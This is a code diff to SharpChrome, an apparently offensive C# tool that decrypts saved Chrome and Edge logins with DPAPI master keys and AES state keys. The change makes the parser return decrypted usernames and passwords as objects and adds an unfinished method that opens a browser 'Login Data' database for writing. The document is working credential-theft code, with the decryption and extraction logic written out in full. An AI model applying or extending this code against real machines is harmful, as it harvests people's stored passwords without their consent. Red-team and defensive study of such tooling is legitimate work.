@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Security.Policy;
 using System.Text;
 using SQLite;
 
@@ -98,23 +99,73 @@ namespace SharpChrome
                 byte[] chromeAesStateKey = GetStateKey(masterKeys, chromeAesStateKeyPath, unprotect, quiet);
                 byte[] edgeAesStateKey = GetStateKey(masterKeys, edgeAesStateKeyPath, unprotect, quiet);
 
-                ParseChromeLogins(masterKeys, chromeLoginDataPath, displayFormat, showAll, unprotect, chromeAesStateKey,
+                var chromeLogins = ParseAndReturnChromeLogins(masterKeys, chromeLoginDataPath, displayFormat, showAll, unprotect, chromeAesStateKey,
                     quiet);
-                ParseChromeLogins(masterKeys, edgeLoginDataPath, displayFormat, showAll, unprotect, edgeAesStateKey,
+                var edgePasswords = ParseAndReturnChromeLogins(masterKeys, edgeLoginDataPath, displayFormat, showAll, unprotect, edgeAesStateKey,
                     quiet);
             }
         }
     }
 
+    public class ExtractedPassword
+    {
+        public string signon_realm { get; set; }
+        public string origin_url { get; set; }
+        public DateTime? date_created { get; set; }
+        public string times_used { get; set; }
+        public string username { get; set; }
+        public string password { get; set; }
+
+        public logins ToWritableLogin()
+        {
+            return new logins() {
+                signon_realm = this.signon_realm,
+                origin_url = this.origin_url,
+                date_created = this.date_created.GetValueOrDefault().ToBinary(),
+                times_used = int.Parse(this.times_used),
+                username_value = this.username,
+                password_value = Encoding.Default.GetBytes(this.password)
+            };
+        }
+    }
+
+    public class logins
+    {
+        public string origin_url { get; set; }
+        public string action_url { get; set; }
+        public string username_element { get; set; }
+        public string username_value { get; set; }
+        public string password_element { get; set; }
+        public byte[] password_value { get; set; }
+        public string submit_element { get; set; }
+        public string signon_realm { get; set; }
+        public long date_created { get; set; }
+        public int blacklisted_by_user { get; set; }
+        public int scheme { get; set; }
+        public int password_type { get; set; }
+        public int times_used { get; set; }
+        public byte[] form_data { get; set; }
+        public string display_name { get; set; }
+        public string icon_url { get; set; }
+        public string federation_url { get; set; }
+        public int skip_zero_click { get; set; }
+        public int generation_upload_status { get; set; }
+        public byte[] possible_username_pairs { get; set; }
+        public int id { get; set; }
+        public long date_last_used { get; set; }
+        public byte[] moving_blocked_for { get; set; }
+        public long date_password_modified { get; set; }
+    }
+
     internal partial class Chrome
     {
-        public static void ParseAndReturnChromeLogins(Dictionary<string, string> masterKeys, string loginDataFilePath,
+        public static List<ExtractedPassword> ParseAndReturnChromeLogins(Dictionary<string, string> masterKeys, string loginDataFilePath,
             string displayFormat = "table", bool showAll = false, bool unprotect = false, byte[] aesStateKey = null,
             bool quiet = false)
         {
             // takes an individual 'Login Data' file path and performs decryption/triage on it
             if (!File.Exists(loginDataFilePath)) {
-                return;
+                return default;
             }
 
             BCrypt.SafeAlgorithmHandle hAlg = null;
@@ -128,7 +179,7 @@ namespace SharpChrome
             // convert to a file:/// uri path type so we can do lockless opening
             //  ref - https://github.com/gentilkiwi/mimikatz/pull/199
             var uri = new System.Uri(loginDataFilePath);
-            string loginDataFilePathUri = String.Format("{0}?nolock=1", uri.AbsoluteUri);
+            string loginDataFilePathUri = $"{uri.AbsoluteUri}?nolock=1";
 
             bool someResults = false;
             SQLiteConnection database = null;
@@ -139,17 +190,19 @@ namespace SharpChrome
             }
             catch (Exception e) {
                 Console.WriteLine("[X] {0}", e.InnerException.Message);
-                return;
+                return default;
             }
 
             if (!displayFormat.Equals("table") && !displayFormat.Equals("csv")) {
                 Console.WriteLine("\r\n[X] Invalid format: {0}", displayFormat);
-                return;
+                return default;
             }
 
             string query =
                 "SELECT signon_realm, origin_url, username_value, password_value, times_used, cast(date_created as text) as date_created FROM logins";
             List<SQLiteQueryRow> results = database.Query2(query, false);
+            
+            List<ExtractedPassword> passwords = new List<ExtractedPassword>(results.Count);
 
             foreach (SQLiteQueryRow row in results) {
                 byte[] passwordBytes = (byte[])row.column[3].Value;
@@ -167,7 +220,7 @@ namespace SharpChrome
                         }
                     }
                     else {
-                        decBytes = Encoding.ASCII.GetBytes(String.Format("--AES STATE KEY NEEDED--"));
+                        decBytes = Encoding.ASCII.GetBytes("--AES STATE KEY NEEDED--");
                     }
                 }
                 else {
@@ -202,25 +255,49 @@ namespace SharpChrome
                                 Console.WriteLine("SEP=,");
                             }
 
-                            Console.WriteLine(
-                                "file_path,signon_realm,origin_url,date_created,times_used,username,password");
+                            Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
                         }
 
                         someResults = true;
 
-                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}",
-                            SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath),
-                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[0].Value)),
-                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
-                            SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
-                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[5].Value)),
-                            SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
-                            SharpDPAPI.Helpers.StringToCSVCell(password));
+                        var one = SharpDPAPI.Helpers.StringToCSVCell(loginDataFilePath);
+                        var two = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[0].Value}");
+                        var three = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[1].Value}");
+                        var four = SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString());
+                        var five = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[5].Value}");
+                        var six = SharpDPAPI.Helpers.StringToCSVCell($"{row.column[2].Value}");
+                        var seven = SharpDPAPI.Helpers.StringToCSVCell(password);
+
+                        var ep = new ExtractedPassword() {
+                            signon_realm = two,
+                            origin_url = three,
+                            date_created = dateCreated,
+                            times_used = five,
+                            username = six,
+                            password = seven
+                        };
+
+                        passwords.Add(ep);
+
+                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6}", one, two, three, four, five, six, seven);
                     }
                 }
             }
 
             database.Close();
+
+            return passwords;
+        }
+        
+        public static void InsertPasswordsIntoDbFile(string loginDataFilePath, IEnumerable<ExtractedPassword> passwords)
+        {
+            var uri = new Uri(loginDataFilePath);
+            string loginDataFilePathUri = $"{uri.AbsoluteUri}?nolock=1";
+            SQLiteConnection database = null;
+            
+            database = new SQLiteConnection(loginDataFilePathUri, SQLiteOpenFlags.ReadWrite, false);
+
+            //database.InsertOrReplace()
         }
     }
 }
